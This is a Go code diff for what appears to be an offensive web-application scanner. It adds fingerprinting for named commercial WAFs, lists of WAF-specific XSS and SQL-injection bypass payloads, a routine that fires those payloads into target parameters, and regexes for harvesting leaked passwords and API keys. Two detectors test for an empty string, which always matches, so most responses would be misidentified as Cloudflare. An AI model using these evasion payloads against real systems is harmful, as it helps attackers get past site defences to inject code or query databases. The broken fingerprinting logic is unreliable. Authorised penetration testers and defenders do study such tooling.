@@ -139,6 +139,149 @@ func ApplyWAFBypass(http *engine.HTTPClient, targetURL, param, payload string) *
 	return nil
 }
 
+// --- WAF Intelligence: Fingerprint + Known Bypasses ---
+
+type WAFProfile struct {
+	Name    string
+	Detect  func(*engine.Response) bool
+	Bypasses []string // known bypass payloads for this WAF
+}
+
+var wafProfiles = []WAFProfile{
+	{
+		Name: "Cloudflare",
+		Detect: func(r *engine.Response) bool {
+			return strings.Contains(r.Headers.Get("Server"), "cloudflare") ||
+				strings.Contains(r.Headers.Get("Cf-Ray"), "")
+		},
+		Bypasses: []string{
+			`<svg/onload=alert(1)>`,
+			`<details/open/ontoggle=alert(1)>`,
+			`"><img src=x onerror=alert&#40;1&#41;>`,
+			`'%0aOR%0a1=1--%0a-`,
+			`/*!50000UNION*//*!50000SELECT*/`,
+			`1'%20or%201%23%0a=1`,
+		},
+	},
+	{
+		Name: "AWS WAF",
+		Detect: func(r *engine.Response) bool {
+			return strings.Contains(r.Headers.Get("X-Amzn-Requestid"), "") ||
+				(r.StatusCode == 403 && strings.Contains(r.Body, "Request blocked"))
+		},
+		Bypasses: []string{
+			`<img src=x oneonerrorrror=alert(1)>`,
+			`<svg/onload=confirm(1)>`,
+			`' /*!OR*/ 1=1-- -`,
+			`'/**/oR/**/1=1--`,
+			`1' AND/**/ 1=1-- -`,
+		},
+	},
+	{
+		Name: "Akamai",
+		Detect: func(r *engine.Response) bool {
+			return strings.Contains(r.Headers.Get("Server"), "AkamaiGHost") ||
+				strings.Contains(r.Body, "Reference&#32;&#35;")
+		},
+		Bypasses: []string{
+			`<d3v/onauxclick=[2].some(confirm)>`,
+			`<svg/onload=alert(String.fromCharCode(49))>`,
+			`' oR 1=1 -- -`,
+			`'%09OR%091=1--%09-`,
+		},
+	},
+	{
+		Name: "Imperva/Incapsula",
+		Detect: func(r *engine.Response) bool {
+			return strings.Contains(r.Headers.Get("X-CDN"), "Imperva") ||
+				strings.Contains(r.Body, "incapsula") ||
+				strings.Contains(r.Headers.Get("Set-Cookie"), "incap_ses")
+		},
+		Bypasses: []string{
+			`<marquee/onstart=alert(1)>`,
+			`<details open ontoggle=alert(1)>`,
+			`' /*!50000OR*/ 1=1-- -`,
+			`'%0boR%0b1=1--%0b-`,
+		},
+	},
+	{
+		Name: "ModSecurity",
+		Detect: func(r *engine.Response) bool {
+			return strings.Contains(r.Headers.Get("Server"), "ModSecurity") ||
+				(r.StatusCode == 403 && strings.Contains(r.Body, "ModSecurity"))
+		},
+		Bypasses: []string{
+			`<svg/onload=alert(1)>`,
+			`' or 1=1-- -`,
+			`1'%20or%201%23%0a=1`,
+			`<img src=x onerror=alert(1)>`,
+		},
+	},
+	{
+		Name: "F5 BIG-IP",
+		Detect: func(r *engine.Response) bool {
+			return strings.Contains(r.Headers.Get("Server"), "BIG-IP") ||
+				strings.Contains(r.Headers.Get("Set-Cookie"), "BIGipServer")
+		},
+		Bypasses: []string{
+			`<body/onload=alert(1)>`,
+			`' OR '1'='1`,
+			`<svg onload=alert(1)>`,
+		},
+	},
+}
+
+// FingerPrintWAF identifies the exact WAF protecting a target
+func FingerprintWAF(h *engine.HTTPClient, target string) string {
+	// Send a known-bad request to trigger WAF
+	testURL := target + "/?test=<script>alert(1)</script>"
+	resp := h.Get(testURL)
+	if resp.Err != nil {
+		return ""
+	}
+	for _, waf := range wafProfiles {
+		if waf.Detect(resp) {
+			return waf.Name
+		}
+	}
+	if resp.StatusCode == 403 || resp.StatusCode == 406 {
+		return "Unknown WAF"
+	}
+	return ""
+}
+
+// GetWAFBypasses returns known bypass payloads for the detected WAF
+func GetWAFBypasses(wafName string) []string {
+	for _, waf := range wafProfiles {
+		if waf.Name == wafName {
+			return waf.Bypasses
+		}
+	}
+	return nil
+}
+
+// SmartWAFBypass tries WAF-specific bypasses first, then generic mutations
+func SmartWAFBypass(h *engine.HTTPClient, targetURL, param, payload, wafName string) *Finding {
+	// Try WAF-specific bypasses first
+	bypasses := GetWAFBypasses(wafName)
+	for _, bp := range bypasses {
+		testURL := injectParam(targetURL, param, bp)
+		resp := h.Get(testURL)
+		if resp.Err == nil && resp.StatusCode != 403 && resp.StatusCode != 429 {
+			if strings.Contains(resp.Body, "alert") || strings.Contains(resp.Body, "49") || strings.Contains(resp.Body, "root:") {
+				return &Finding{
+					Type: fmt.Sprintf("WAF Bypass: %s", wafName), Severity: "critical",
+					URL: testURL, Param: param, Payload: bp,
+					Detail:   fmt.Sprintf("Known %s bypass succeeded", wafName),
+					Template: "apex-waf-bypass",
+				}
+			}
+		}
+	}
+	// Fall back to generic mutations
+	return ApplyWAFBypass(h, targetURL, param, payload)
+}
+
 // --- Passive Scanners: JS Secrets, Source Maps, Dependency Confusion ---
 
 var secretPatterns = map[string]*regexp.Regexp{
@@ -155,10 +298,12 @@ var secretPatterns = map[string]*regexp.Regexp{
 	"Twilio SID":           regexp.MustCompile(`AC[a-f0-9]{32}`),
 	"SendGrid Key":         regexp.MustCompile(`SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}`),
 	"Mailgun Key":          regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
-	"Heroku API Key":       regexp.MustCompile(`[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`),
+	"Heroku API Key":       regexp.MustCompile(`(?i)(?:heroku|HEROKU)['":\s=_-]*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`),
 	"OAuth Client Secret":  regexp.MustCompile(`(?i)client[_-]?secret['":\s=]+['"]([a-zA-Z0-9_\-]{20,})['"]`),
-	"Internal URL":         regexp.MustCompile(`(?i)['"]https?://(?:internal|staging|dev|admin|localhost)[^'"]{5,}['"]`),
+	"Internal URL":         regexp.MustCompile(`(?i)['"]https?://(?:internal|staging|dev|admin)\.[a-zA-Z0-9][^'"]{5,}['"]`),
 	"Base64 Credentials":   regexp.MustCompile(`(?i)(?:auth|token|cred)['":\s=]+['"]([A-Za-z0-9+/]{20,}={0,2})['"]`),
+	"Hardcoded Password":   regexp.MustCompile(`(?i)(?:password|passwd|pwd)['":\s=]+['"]([^'"]{6,})['"]`),
+	"API Key in URL":       regexp.MustCompile(`(?i)(?:api[_-]?key|apikey|access[_-]?token)['":\s=]+['"]([a-zA-Z0-9_\-]{16,})['"]`),
 }
 
 func scanJSSecrets(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
